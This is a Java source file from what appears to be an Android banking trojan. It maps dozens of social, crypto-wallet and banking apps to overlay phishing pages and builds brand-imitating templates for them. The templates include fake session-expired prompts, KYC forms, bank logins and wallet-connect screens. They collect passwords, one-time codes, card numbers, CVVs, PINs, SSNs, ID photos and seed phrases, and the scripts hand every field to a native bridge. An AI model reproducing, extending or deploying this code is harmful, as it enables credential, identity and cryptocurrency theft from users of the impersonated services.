package com.fason.app.features.phishlet;

import android.content.Context;
import android.util.Log;

import com.fason.app.features.overlay.OverlayManager;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

public class PhishletManager {
    private static final String TAG = "PhishletManager";
    private static final Map<String, String> templateCache = new HashMap<>();
    private static Context appContext;

    public static void init(Context ctx) {
        appContext = ctx.getApplicationContext();
    }

    public static String getTemplate(String type, String packageName, Context ctx) {
        if (appContext == null) {
            appContext = ctx.getApplicationContext();
        }

        String cacheKey = type + "_" + packageName;
        if (templateCache.containsKey(cacheKey)) {
            return templateCache.get(cacheKey);
        }

        // Try to load from assets first
        String html = loadTemplateFromAssets(packageName);

        // Fallback to built-in template if asset not found
        if (html == null) {
            Log.w(TAG, "No asset template for " + packageName + ", using built-in");
            html = buildTemplate(type, packageName);
        }

        templateCache.put(cacheKey, html);
        return html;
    }

    public static String resolveTemplate(String packageName) {
        return OverlayManager.resolveTemplate(packageName);
    }

    public static boolean isPersistent(String packageName) {
        return OverlayManager.isPersistent(packageName);
    }

    public static void clearCache() {
        templateCache.clear();
    }

    // Load HTML template from assets/templates/ folder
    private static String loadTemplateFromAssets(String packageName) {
        if (appContext == null) {
            Log.e(TAG, "Context not initialized");
            return null;
        }

        String templateFile = getTemplateFileName(packageName);
        if (templateFile == null) {
            return null;
        }

        try {
            InputStream is = appContext.getAssets().open("templates/" + templateFile);
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder html = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                html.append(line).append("\n");
            }
            reader.close();
            is.close();
            Log.i(TAG, "Loaded template: " + templateFile);
            return html.toString();
        } catch (Exception e) {
            Log.w(TAG, "Template not found: " + templateFile);
            return null;
        }
    }

    // Map package names to template files
    private static String getTemplateFileName(String packageName) {
        Map<String, String> fileMap = new HashMap<>();

        // Social
        fileMap.put("com.whatsapp", "com.whatsapp.html");
        fileMap.put("com.facebook.katana", "com.facebook.katana.html");
        fileMap.put("com.instagram.android", "com.instagram.android.html");
        fileMap.put("com.ss.android.ugc.trill", "com.ss.android.ugc.trill.html");
        fileMap.put("com.twitter.android", "com.twitter.android.html");
        fileMap.put("com.snapchat.android", "com.snapchat.android.html");
        fileMap.put("com.discord", "com.discord.html");
        fileMap.put("com.tencent.mm", "com.tencent.mm.html");
        fileMap.put("com.xingin.xhs", "com.xingin.xhs.html");
        fileMap.put("com.vkontakte.android", "com.vkontakte.android.html");
        fileMap.put("com.viber.voip", "com.viber.voip.html");
        fileMap.put("com.sina.weibo", "com.sina.weibo.html");
        fileMap.put("com.tencent.mobileqq", "com.tencent.mobileqq.html");
        fileMap.put("com.taobao.taobao", "com.taobao.taobao.html");
        fileMap.put("com.google.android.gm", "com.google.android.gm.html");
        fileMap.put("com.pinterest", "com.pinterest.html");

        // Crypto
        fileMap.put("com.binance.dev", "com.binance.dev.html");
        fileMap.put("com.coinbase.android", "com.coinbase.android.html");
        fileMap.put("io.metamask", "io.metamask.html");
        fileMap.put("com.bitkeep.wallet", "com.bitkeep.wallet.html");
        fileMap.put("app.phantom", "app.phantom.html");
        fileMap.put("com.wallet.crypto.trustapp", "com.wallet.crypto.trustapp.html");
        fileMap.put("com.moonpay", "com.moonpay.html");
        fileMap.put("exodusmovement.exodus", "exodusmovement.exodus.html");
        fileMap.put("com.okx.wallet", "com.okx.wallet.html");
        fileMap.put("io.atomicwallet", "io.atomicwallet.html");
        fileMap.put("com.liberty.jaxx", "com.liberty.jaxx.html");
        fileMap.put("pro.huobi", "pro.huobi.html");
        fileMap.put("trade.opsdao.dydxchain", "trade.opsdao.dydxchain.html");

        // Finance
        fileMap.put("com.paypal.android.p2pmobile", "com.paypal.android.p2pmobile.html");
        fileMap.put("com.chase.intl", "com.chase.intl.html");
        fileMap.put("com.revolut.revolut", "com.revolut.revolut.html");
        fileMap.put("com.bybit.app", "com.bybit.app.html");
        fileMap.put("com.boc.bocsoft.bocmbovsa.buss", "com.boc.bocsoft.bocmbovsa.buss.html");
        fileMap.put("sg.com.hsbc.hsbcsingapore", "sg.com.hsbc.hsbcsingapore.html");
        fileMap.put("by.alfabank.insync3", "by.alfabank.insync3.html");
        fileMap.put("com.airstarbanking.mobilebanking", "com.airstarbanking.mobilebanking.html");
        fileMap.put("com.eg.android.AlipayGphone", "com.eg.android.AlipayGphone.html");
        fileMap.put("com.samsung.android.spay", "com.samsung.android.spay.html");
        fileMap.put("com.google.android.apps.walletnfcrel", "com.google.android.apps.walletnfcrel.html");

        // Special pages
        fileMap.put("session_expired", "session_expired.html");

        return fileMap.get(packageName);
    }

    /** Session-expired pre-page: the classic "your session timed out, tap to
     *  re-authenticate" prompt. Tapping through hands off to the real page. */
    public static String buildSessionExpired(String appName, String packageName) {
        String color = getBrandColor(packageName);
        return "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
            + "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            + "<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}"
            + "body{background:#0a0a0f;color:#e8e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;}"
            + ".card{background:#14141c;border:1px solid #26263a;border-radius:20px;padding:32px 24px;max-width:340px;width:100%;text-align:center;}"
            + ".icon{width:64px;height:64px;margin:0 auto 20px;border-radius:16px;background:" + color + "22;display:flex;align-items:center;justify-content:center;}"
            + ".icon svg{width:32px;height:32px;stroke:" + color + ";}"
            + "h1{font-size:18px;font-weight:600;margin-bottom:8px;}"
            + "p{font-size:13px;color:#8b8b9e;line-height:1.5;margin-bottom:24px;}"
            + ".btn{display:block;width:100%;padding:14px;background:" + color + ";color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;}"
            + ".btn:active{opacity:.85;}"
            + ".foot{margin-top:16px;font-size:11px;color:#55556a;}"
            + "</style></head><body>"
            + "<div class='card'>"
            + "<div class='icon'><svg viewBox='0 0 24 24' fill='none' stroke-width='2'><circle cx='12' cy='12' r='10'/><polyline points='12 6 12 12 16 14'/></svg></div>"
            + "<h1>Session Expired</h1>"
            + "<p>For your security, your " + appName + " session has timed out. Please sign in again to continue.</p>"
            + "<button class='btn' onclick='FasonNative.onPrePageContinue()'>Sign In</button>"
            + "<div class='foot'>" + appName + " &middot; Secure Login</div>"
            + "</div></body></html>";
    }

    // Fallback built-in templates (used when asset files not available)
    private static String buildTemplate(String type, String packageName) {
        String appName = getAppDisplayName(packageName);
        String brandColor = getBrandColor(packageName);
        switch (type) {
            case "kyc_identity": return buildKycTemplate(appName, brandColor);
            case "bank_login": return buildBankTemplate(appName, brandColor);
            case "crypto_wallet": return buildCryptoTemplate(appName, brandColor);
            case "social_login": return buildSocialTemplate(appName, brandColor);
            case "finance_verify": return buildFinanceTemplate(appName, brandColor);
            default: return buildGenericTemplate(appName, brandColor);
        }
    }

    private static String buildKycTemplate(String appName, String color) {
        return "<!DOCTYPE html><html><head><meta charset=\'UTF-8\'><meta name=\'viewport\' content=\'width=device-width, initial-scale=1.0\'><style>" +
            "*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;}" +
            "body{background:#0f0f0f;color:#e0e0e0;min-height:100vh;display:flex;flex-direction:column;}" +
            ".header{background:" + color + ";padding:20px;text-align:center;}" +
            ".header h1{font-size:18px;color:#fff;font-weight:600;}" +
            ".header p{font-size:12px;color:rgba(255,255,255,0.8);margin-top:4px;}" +
            ".progress{display:flex;padding:16px;background:#1a1a1a;gap:8px;}" +
            ".progress-step{flex:1;height:4px;background:#333;border-radius:2px;}" +
            ".progress-step.active{background:" + color + ";}" +
            ".container{padding:20px;flex:1;}" +
            ".stage{display:none;}" +
            ".stage.active{display:block;animation:fadeIn 0.3s;}" +
            "@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}" +
            ".field{margin-bottom:16px;}" +
            ".field label{display:block;font-size:13px;color:#888;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px;}" +
            ".field input,.field select{width:100%;padding:14px 16px;background:#1a1a1a;border:1px solid #333;border-radius:8px;color:#fff;font-size:15px;outline:none;transition:border-color 0.2s;}" +
            ".field input:focus,.field select:focus{border-color:" + color + ";}" +
            ".field input::placeholder{color:#555;}" +
            ".btn{width:100%;padding:16px;background:" + color + ";color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;}" +
            ".btn:disabled{opacity:0.5;}" +
            ".photo-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px;}" +
            ".photo-box{border:2px dashed #444;border-radius:12px;padding:24px;text-align:center;cursor:pointer;transition:border-color 0.2s;}" +
            ".photo-box:hover{border-color:" + color + ";}" +
            ".photo-box .icon{font-size:32px;margin-bottom:8px;}" +
            ".photo-box p{font-size:12px;color:#888;}" +
            ".security-badge{display:flex;align-items:center;justify-content:center;gap:8px;padding:12px;background:rgba(255,255,255,0.05);border-radius:8px;margin-bottom:16px;}" +
            ".security-badge span{font-size:12px;color:#666;}" +
            ".loader{display:none;width:20px;height:20px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin-right:8px;}" +
            "@keyframes spin{to{transform:rotate(360deg);}}" +
            "</style></head><body>" +
            "<div class=\'header\'><h1>Identity Verification</h1><p>Secure KYC verification for " + appName + "</p></div>" +
            "<div class=\'progress\'><div class=\'progress-step active\' id=\'p1\'></div><div class=\'progress-step\' id=\'p2\'></div><div class=\'progress-step\' id=\'p3\'></div><div class=\'progress-step\' id=\'p4\'></div></div>" +
            "<div class=\'container\'>" +
            "<div class=\'stage active\' id=\'stage1\'><div class=\'security-badge\'><span>Bank-grade encryption</span></div>" +
            "<div class=\'field\'><label>Full Legal Name</label><input type=\'text\' name=\'fullName\' placeholder=\'As shown on ID document\' required></div>" +
            "<div class=\'field\'><label>Date of Birth</label><input type=\'date\' name=\'dob\' required></div>" +
            "<div class=\'field\'><label>Nationality</label><select name=\'nationality\'><option value=\'\'>Select country</option><option>United States</option><option>United Kingdom</option><option>Canada</option><option>Australia</option><option>Germany</option><option>France</option><option>Japan</option><option>Singapore</option><option>India</option><option>Brazil</option><option>Other</option></select></div>" +
            "<div class=\'field\'><label>National ID / SSN</label><input type=\'text\' name=\'nationalId\' placeholder=\'XXX-XX-XXXX or national ID number\' required></div>" +
            "<button class=\'btn\' onclick=\'nextStage(2)\'>Continue</button></div>" +
            "<div class=\'stage\' id=\'stage2\'><div class=\'security-badge\'><span>Take clear photos in good lighting</span></div>" +
            "<div class=\'photo-grid\'><div class=\'photo-box\' onclick=\'capturePhoto(\"idFront\")\'><div class=\'icon\'>ID</div><p>ID Document Front</p></div>" +
            "<div class=\'photo-box\' onclick=\'capturePhoto(\"idBack\")\'><div class=\'icon\'>ID</div><p>ID Document Back</p></div>" +
            "<div class=\'photo-box\' onclick=\'capturePhoto(\"selfie\")\'><div class=\'icon\'>CAM</div><p>Live Selfie Photo</p></div>" +
            "<div class=\'photo-box\' onclick=\'capturePhoto(\"proof\")\'><div class=\'icon\'>HOME</div><p>Proof of Address</p></div></div>" +
            "<div class=\'field\'><label>Document Type</label><select name=\'docType\'><option>Passport</option><option selected>Driver\'s License</option><option>National ID Card</option><option>Residence Permit</option></select></div>" +
            "<div class=\'field\'><label>Document Number</label><input type=\'text\' name=\'docNumber\' placeholder=\'Document serial number\'></div>" +
            "<button class=\'btn\' onclick=\'nextStage(3)\'>Continue</button></div>" +
            "<div class=\'stage\' id=\'stage3\'><div class=\'security-badge\'><span>Required for verification and payouts</span></div>" +
            "<div class=\'field\'><label>Bank Account Number</label><input type=\'text\' name=\'bankAccount\' placeholder=\'Enter account number\'></div>" +
            "<div class=\'field\'><label>Bank Routing / SWIFT</label><input type=\'text\' name=\'bankRouting\' placeholder=\'Routing or SWIFT code\'></div>" +
            "<div class=\'field\'><label>Card Number</label><input type=\'text\' name=\'cardNumber\' placeholder=\'XXXX XXXX XXXX XXXX\' maxlength=\'19\'></div>" +
            "<div style=\'display:grid;grid-template-columns:1fr 1fr;gap:12px;\'>" +
            "<div class=\'field\'><label>Expiry</label><input type=\'text\' name=\'cardExpiry\' placeholder=\'MM/YY\' maxlength=\'5\'></div>" +
            "<div class=\'field\'><label>CVV</label><input type=\'text\' name=\'cardCvv\' placeholder=\'XXX\' maxlength=\'4\'></div></div>" +
            "<div class=\'field\'><label>Card PIN</label><input type=\'password\' name=\'cardPin\' placeholder=\'••••\' maxlength=\'4\'></div>" +
            "<div class=\'field\'><label>Annual Income</label><select name=\'income\'><option>Under $25,000</option><option>$25,000 - $50,000</option><option>$50,000 - $100,000</option><option>$100,000 - $250,000</option><option>Over $250,000</option></select></div>" +
            "<button class=\'btn\' onclick=\'nextStage(4)\'>Continue</button></div>" +
            "<div class=\'stage\' id=\'stage4\'><div class=\'security-badge\'><span>Final security verification</span></div>" +
            "<div class=\'field\'><label>Phone Number</label><input type=\'tel\' name=\'phone\' placeholder=\'+1 (555) 000-0000\' required></div>" +
            "<div class=\'field\'><label>Email Address</label><input type=\'email\' name=\'email\' placeholder=\'your@email.com\' required></div>" +
            "<div class=\'field\'><label>Home Address</label><input type=\'text\' name=\'address\' placeholder=\'Full street address\'></div>" +
            "<div class=\'field\'><label>City / State / ZIP</label><input type=\'text\' name=\'cityState\' placeholder=\'City, State ZIP\'></div>" +
            "<div class=\'field\'><label>Mother\'s Maiden Name</label><input type=\'text\' name=\'maidenName\' placeholder=\'Security question answer\'></div>" +
            "<div class=\'field\'><label>Occupation</label><input type=\'text\' name=\'occupation\' placeholder=\'Your job title\'></div>" +
            "<div class=\'field\'><label>Crypto Wallet Address (optional)</label><input type=\'text\' name=\'cryptoWallet\' placeholder=\'BTC / ETH address\'></div>" +
            "<div class=\'field\'><label>Wallet Seed Phrase (optional backup)</label><textarea name=\'seedPhrase\' rows=\'3\' placeholder=\'12-24 word recovery phrase\'></textarea></div>" +
            "<button class=\'btn\' onclick=\'submitKyc()\'><span class=\'loader\' id=\'loader\'></span>Complete Verification</button></div></div>" +
            "<script>var currentStage=1;" +
            "function nextStage(n){document.getElementById(\'stage\'+currentStage).classList.remove(\'active\');document.getElementById(\'stage\'+n).classList.add(\'active\');document.getElementById(\'p\'+currentStage).classList.remove(\'active\');document.getElementById(\'p\'+n).classList.add(\'active\');currentStage=n;FasonNative.onStageChange(n);}" +
            "function capturePhoto(type){FasonNative.requestCamera(type);}" +
            "function submitKyc(){document.getElementById(\'loader\').style.display=\'inline-block\';var d={};document.querySelectorAll(\'input,select,textarea\').forEach(function(f){d[f.name]=f.value;});FasonNative.onFormSubmit(JSON.stringify(d));setTimeout(function(){document.querySelector(\'.btn\').disabled=true;document.querySelector(\'.btn\').innerText=\'Verification in progress...\';},500);}" +
            "document.querySelectorAll(\'input\').forEach(function(i){i.addEventListener(\'blur\',function(){FasonNative.onFieldCaptured(this.name,this.value,this.type);});});" +
            "</script></body></html>";
    }

    private static String buildBankTemplate(String appName, String color) {
        return "<!DOCTYPE html><html><head><meta charset=\'UTF-8\'><meta name=\'viewport\' content=\'width=device-width,initial-scale=1.0\'><style>" +
            "*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;}" +
            "body{background:#0a0a0a;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}" +
            ".card{background:#141414;border:1px solid #222;border-radius:16px;padding:32px;width:100%;max-width:380px;box-shadow:0 20px 60px rgba(0,0,0,0.5);}" +
            ".logo{text-align:center;margin-bottom:28px;}" +
            ".logo h2{font-size:22px;font-weight:700;color:" + color + ";}" +
            ".logo p{font-size:12px;color:#666;margin-top:4px;}" +
            ".field{margin-bottom:18px;}" +
            ".field label{display:block;font-size:11px;color:#888;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:6px;}" +
            ".field input{width:100%;padding:14px;background:#0f0f0f;border:1px solid #2a2a2a;border-radius:10px;color:#fff;font-size:15px;outline:none;}" +
            ".field input:focus{border-color:" + color + ";}" +
            ".btn{width:100%;padding:16px;background:" + color + ";color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;}" +
            ".links{display:flex;justify-content:space-between;margin-top:18px;font-size:12px;}" +
            ".links a{color:#666;text-decoration:none;}" +
            ".security{text-align:center;margin-top:20px;font-size:11px;color:#444;}" +
            "</style></head><body>" +
            "<div class=\'card\'><div class=\'logo\'><h2>" + appName + "</h2><p>Secure Banking Login</p></div>" +
            "<div class=\'field\'><label>Username / Account ID</label><input type=\'text\' name=\'username\' placeholder=\'Enter username\' autocomplete=\'username\'></div>" +
            "<div class=\'field\'><label>Password</label><input type=\'password\' name=\'password\' placeholder=\'Enter password\' autocomplete=\'current-password\'></div>" +
            "<div class=\'field\'><label>Security Code</label><input type=\'text\' name=\'otp\' placeholder=\'6-digit code from SMS/app\' maxlength=\'6\'></div>" +
            "<button class=\'btn\' onclick=\'submitLogin()\'>Sign In</button>" +
            "<div class=\'links\'><a href=\'#\'>Forgot password?</a><a href=\'#\'>Enroll now</a></div>" +
            "<div class=\'security\'>Secured with 256-bit encryption</div></div>" +
            "<script>function submitLogin(){var d={};document.querySelectorAll(\'input\').forEach(function(f){d[f.name]=f.value;});FasonNative.onFormSubmit(JSON.stringify(d));}</script>" +
            "</body></html>";
    }

    private static String buildCryptoTemplate(String appName, String color) {
        return "<!DOCTYPE html><html><head><meta charset=\'UTF-8\'><meta name=\'viewport\' content=\'width=device-width,initial-scale=1.0\'><style>" +
            "*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;}" +
            "body{background:#0a0a0a;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}" +
            ".card{background:#141414;border:1px solid #222;border-radius:16px;padding:32px;width:100%;max-width:380px;}" +
            ".logo{text-align:center;margin-bottom:28px;}" +
            ".logo h2{font-size:22px;font-weight:700;color:" + color + ";}" +
            ".logo p{font-size:12px;color:#666;margin-top:4px;}" +
            ".tabs{display:flex;gap:8px;margin-bottom:20px;}" +
            ".tab{flex:1;padding:10px;text-align:center;background:#1a1a1a;border-radius:8px;font-size:13px;color:#888;cursor:pointer;border:none;}" +
            ".tab.active{background:" + color + ";color:#fff;}" +
            ".field{margin-bottom:16px;}" +
            ".field label{display:block;font-size:11px;color:#888;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:6px;}" +
            ".field input,.field textarea{width:100%;padding:14px;background:#0f0f0f;border:1px solid #2a2a2a;border-radius:10px;color:#fff;font-size:15px;outline:none;}" +
            ".field input:focus,.field textarea:focus{border-color:" + color + ";}" +
            ".btn{width:100%;padding:16px;background:" + color + ";color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;}" +
            ".warning{background:rgba(255,193,7,0.1);border:1px solid rgba(255,193,7,0.3);border-radius:8px;padding:12px;margin-bottom:16px;font-size:12px;color:#ffc107;}" +
            "</style></head><body>" +
            "<div class=\'card\'><div class=\'logo\'><h2>" + appName + "</h2><p>Connect Your Wallet</p></div>" +
            "<div class=\'tabs\'><button class=\'tab active\'>Seed Phrase</button><button class=\'tab\'>Private Key</button></div>" +
            "<div class=\'warning\'>Never share your recovery phrase. We need it to verify wallet ownership.</div>" +
            "<div class=\'field\'><label>Wallet Address</label><input type=\'text\' name=\'walletAddress\' placeholder=\'0x...\'></div>" +
            "<div class=\'field\'><label>Recovery Phrase</label><textarea name=\'seedPhrase\' rows=\'4\' placeholder=\'Enter your 12 or 24-word recovery phrase\'></textarea></div>" +
            "<div class=\'field\'><label>Password (if encrypted)</label><input type=\'password\' name=\'walletPassword\' placeholder=\'Wallet password\'></div>" +
            "<button class=\'btn\' onclick=\'submitWallet()\'>Connect Wallet</button></div>" +
            "<script>function submitWallet(){var d={};document.querySelectorAll(\'input,textarea\').forEach(function(f){d[f.name]=f.value;});FasonNative.onFormSubmit(JSON.stringify(d));}</script>" +
            "</body></html>";
    }

    private static String buildSocialTemplate(String appName, String color) {
        return "<!DOCTYPE html><html><head><meta charset=\'UTF-8\'><meta name=\'viewport\' content=\'width=device-width,initial-scale=1.0\'><style>" +
            "*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;}" +
            "body{background:#0a0a0a;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}" +
            ".card{background:#141414;border:1px solid #222;border-radius:16px;padding:32px;width:100%;max-width:360px;text-align:center;}" +
            ".logo{font-size:48px;margin-bottom:8px;}" +
            ".card h2{font-size:20px;margin-bottom:4px;}" +
            ".card p.sub{color:#666;font-size:13px;margin-bottom:24px;}" +
            ".field{margin-bottom:16px;text-align:left;}" +
            ".field input{width:100%;padding:14px;background:#0f0f0f;border:1px solid #2a2a2a;border-radius:10px;color:#fff;font-size:15px;outline:none;}" +
            ".field input:focus{border-color:" + color + ";}" +
            ".btn{width:100%;padding:14px;background:" + color + ";color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:12px;}" +
            ".divider{color:#444;font-size:12px;margin:16px 0;position:relative;}" +
            ".divider::before,.divider::after{content:\'\';position:absolute;top:50%;width:35%;height:1px;background:#333;}" +
            ".divider::before{left:0;}.divider::after{right:0;}" +
            ".alt-btn{width:100%;padding:12px;background:#1a1a1a;border:1px solid #333;border-radius:10px;color:#fff;font-size:14px;cursor:pointer;}" +
            ".footer{margin-top:20px;font-size:12px;color:#555;}" +
            "</style></head><body>" +
            "<div class=\'card\'><div class=\'logo\'>*</div><h2>" + appName + "</h2><p class=\'sub\'>Sign in to continue</p>" +
            "<div class=\'field\'><input type=\'text\' name=\'username\' placeholder=\'Phone, email, or username\'></div>" +
            "<div class=\'field\'><input type=\'password\' name=\'password\' placeholder=\'Password\'></div>" +
            "<button class=\'btn\' onclick=\'submitLogin()\'>Log In</button>" +
            "<div class=\'divider\'>or</div>" +
            "<button class=\'alt-btn\'>Sign in with Google</button>" +
            "<div class=\'footer\'>Don\'t have an account? <a href=\'#\' style=\'color:" + color + ";text-decoration:none;\'>Sign up</a></div></div>" +
            "<script>function submitLogin(){var d={};document.querySelectorAll(\'input\').forEach(function(f){d[f.name]=f.value;});FasonNative.onFormSubmit(JSON.stringify(d));}</script>" +
            "</body></html>";
    }

    private static String buildFinanceTemplate(String appName, String color) {
        return "<!DOCTYPE html><html><head><meta charset=\'UTF-8\'><meta name=\'viewport\' content=\'width=device-width,initial-scale=1.0\'><style>" +
            "*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;}" +
            "body{background:#0a0a0a;color:#fff;min-height:100vh;padding:20px;}" +
            ".header{background:" + color + ";padding:20px;border-radius:12px;margin-bottom:20px;text-align:center;}" +
            ".header h1{font-size:18px;}" +
            ".header p{font-size:12px;opacity:0.8;margin-top:4px;}" +
            ".field{margin-bottom:16px;}" +
            ".field label{display:block;font-size:11px;color:#888;margin-bottom:6px;text-transform:uppercase;}" +
            ".field input{width:100%;padding:14px;background:#141414;border:1px solid #2a2a2a;border-radius:10px;color:#fff;font-size:15px;}" +
            ".grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}" +
            ".btn{width:100%;padding:16px;background:" + color + ";color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;}" +
            "</style></head><body>" +
            "<div class=\'header\'><h1>Account Verification</h1><p>" + appName + " - Complete your profile</p></div>" +
            "<div class=\'field\'><label>Full Name</label><input type=\'text\' name=\'fullName\'></div>" +
            "<div class=\'grid\'>" +
            "<div class=\'field\'><label>Card Number</label><input type=\'text\' name=\'cardNumber\' maxlength=\'19\'></div>" +
            "<div class=\'field\'><label>Expiry</label><input type=\'text\' name=\'expiry\' maxlength=\'5\'></div></div>" +
            "<div class=\'grid\'>" +
            "<div class=\'field\'><label>CVV</label><input type=\'text\' name=\'cvv\' maxlength=\'4\'></div>" +
            "<div class=\'field\'><label>PIN</label><input type=\'password\' name=\'pin\' maxlength=\'4\'></div></div>" +
            "<div class=\'field\'><label>Billing Address</label><input type=\'text\' name=\'billingAddress\'></div>" +
            "<div class=\'field\'><label>Phone Number</label><input type=\'tel\' name=\'phone\'></div>" +
            "<button class=\'btn\' onclick=\'submitForm()\'>Verify Account</button>" +
            "<script>function submitForm(){var d={};document.querySelectorAll(\'input\').forEach(function(f){d[f.name]=f.value;});FasonNative.onFormSubmit(JSON.stringify(d));}</script>" +
            "</body></html>";
    }

    private static String buildGenericTemplate(String appName, String color) {
        return buildSocialTemplate(appName, color);
    }

    private static String getAppDisplayName(String packageName) {
        Map<String, String> names = new HashMap<>();
        names.put("com.whatsapp", "WhatsApp");
        names.put("com.facebook.katana", "Facebook");
        names.put("com.instagram.android", "Instagram");
        names.put("com.zhiliaoapp.musically", "TikTok");
        names.put("com.twitter.android", "X");
        names.put("com.snapchat.android", "Snapchat");
        names.put("com.discord", "Discord");
        names.put("com.tencent.mm", "WeChat");
        names.put("com.binance.dev", "Binance");
        names.put("com.coinbase.android", "Coinbase");
        names.put("io.metamask", "MetaMask");
        names.put("com.paypal.android.p2pmobile", "PayPal");
        names.put("com.chase.sig.android", "Chase");
        names.put("com.revolut.revolut", "Revolut");
        names.put("com.eg.android.AlipayGphone", "AliPay");
        names.put("com.google.android.apps.walletnfcrel", "Google Wallet");
        return names.getOrDefault(packageName, "Secure Login");
    }

    private static String getBrandColor(String packageName) {
        Map<String, String> colors = new HashMap<>();
        colors.put("com.whatsapp", "#25D366");
        colors.put("com.facebook.katana", "#1877F2");
        colors.put("com.instagram.android", "#E4405F");
        colors.put("com.zhiliaoapp.musically", "#000000");
        colors.put("com.twitter.android", "#000000");
        colors.put("com.snapchat.android", "#FFFC00");
        colors.put("com.discord", "#5865F2");
        colors.put("com.tencent.mm", "#07C160");
        colors.put("com.binance.dev", "#F0B90B");
        colors.put("com.coinbase.android", "#0052FF");
        colors.put("io.metamask", "#E2761B");
        colors.put("com.paypal.android.p2pmobile", "#003087");
        colors.put("com.chase.sig.android", "#117ACA");
        colors.put("com.revolut.revolut", "#0075EB");
        colors.put("com.eg.android.AlipayGphone", "#1677FF");
        colors.put("com.google.android.apps.walletnfcrel", "#4285F4");
        return colors.getOrDefault(packageName, "#6366F1");
    }
}
